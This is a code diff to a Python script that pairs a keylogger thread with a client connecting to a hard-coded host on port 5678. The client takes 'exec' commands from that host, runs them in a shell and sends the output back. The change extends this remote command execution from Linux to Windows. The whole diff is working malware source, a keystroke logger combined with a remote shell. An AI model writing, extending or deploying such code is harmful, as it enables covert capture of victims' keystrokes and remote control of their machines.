@@ -13,8 +13,8 @@ def start_keylogging():
     with Listener(on_press = on_press, on_release = None) as listener:
         listener.join()
 
-def start_client():
-    HOST = "192.168.24.5"
+def start_client(opSys):
+    HOST = "192.168.90.5"
     #HOST = "172.16.120.153"
     PORT = 5678
 
@@ -29,9 +29,14 @@ def start_client():
         c = data.decode().split()
         if c[0] == "exec":
             binp = " ".join(c[1:])
-            open("tempBash.sh", "w").write(binp + " > bashOutput")
-            os.system("./tempBash.sh")
-            output = open("bashOutput", "rb").read()
+            if opSys == "linux":
+                print("starting linux")
+                open("tempBash.sh", "w").write(binp + " > bashOutput")
+                os.system("./tempBash.sh")
+                output = open("bashOutput", "rb").read()
+            elif opSys == "windows":
+                print("starting windows")
+                output = bytes(os.popen(binp).read(), encoding = "utf8")
             if output:
                 s.sendall(output)
             else:
@@ -56,13 +61,14 @@ def start_client():
         print(c)
 
 if __name__ == "__main__":
-    if platform.system() == "Linux":
+    opSys = platform.system().lower()
+    if opSys == "linux":
         open("tempBash.sh", "w")
         open("bashOutput", "w")
         os.system("chmod +x tempBash.sh")
 
     t1 = threading.Thread(target = start_keylogging)
-    t2 = threading.Thread(target = start_client)
+    t2 = threading.Thread(target = start_client, args = [opSys])
 
     t1.start()
     t2.start()
